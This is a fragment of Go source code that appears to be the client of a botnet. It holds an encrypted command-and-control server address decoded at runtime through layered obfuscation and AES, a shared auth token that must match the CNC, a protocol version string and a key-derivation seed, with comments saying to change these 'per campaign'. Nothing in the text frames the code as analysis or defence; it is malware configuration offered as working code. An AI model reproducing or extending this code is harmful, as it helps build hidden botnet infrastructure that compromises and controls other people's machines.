...
// gothTits holds the obfuscated C2 address, decrypted at runtime from encGothTits.
var gothTits string

// cryptSeed is the 8-char hex seed used for key derivation.
const cryptSeed = "8fb860e5" //change me run setup.py

// magicCode is the shared auth token — must match CNC.
const magicCode = "TICCf2#hOLhNOUng" //change this per campaign

// protocolVersion must match the CNC's protocol version string.
const protocolVersion = "proto43" //change this per campaign
...
var encGothTits, _ = hex.DecodeString("90e92f947e341c493862877e7d1c7d3557c534066b75c1776d3420260796105ca610c47f62af6896fc12ca07939653f722156129083bee68") //change me run setup.py
...
func initSensitiveStrings() {
	// C2 address (AES layer wrapping the 5-layer obfuscation)
	gothTits = string(garuda(encGothTits))
